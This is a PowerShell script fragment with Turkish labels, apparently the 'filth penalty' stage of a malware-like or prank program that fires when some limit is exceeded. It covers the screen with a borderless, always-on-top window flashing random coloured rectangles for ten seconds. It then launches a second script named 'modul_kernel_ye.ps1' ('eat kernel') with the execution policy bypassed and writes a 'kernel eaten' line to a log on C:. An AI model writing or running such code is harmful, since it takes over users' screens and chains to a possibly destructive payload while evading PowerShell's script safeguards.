# ============================================================
# EN – PİSLİK CEZASI (SINIR AŞILIRSA)
# ============================================================

try {
    Write-Host "EN: SINIR AŞILDI! PİSLİK CEZASI BASLIYOR..." -ForegroundColor Red -BackgroundColor Black

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 30
    $timer.Add_Tick({
        try {
            $g = $form.CreateGraphics()
            for ($i=0; $i -lt 500; $i++) {
                $x = Get-Random -Min 0 -Max $form.Width
                $y = Get-Random -Min 0 -Max $form.Height
                $w = Get-Random -Min 1 -Max 100
                $h = Get-Random -Min 1 -Max 30
                $r = Get-Random -Min 0 -Max 256
                $g2 = Get-Random -Min 0 -Max 256
                $b = Get-Random -Min 0 -Max 256
                $renk = [System.Drawing.Color]::FromArgb($r, $g2, $b)
                $brush = New-Object System.Drawing.SolidBrush($renk)
                $g.FillRectangle($brush, $x, $y, $w, $h)
            }
            $g.Dispose()
        } catch {}
    })
    $timer.Start()

    Start-Sleep -Seconds 10
    $timer.Stop()
    $form.Close()

    if (Test-Path "modul_kernel_ye.ps1") {
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File modul_kernel_ye.ps1"
    }

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Pislik cezasi uygulandi. Kernel yendi."
} catch {
    Write-Host "Pislik cezasi hatasi: $_" -ForegroundColor Red
}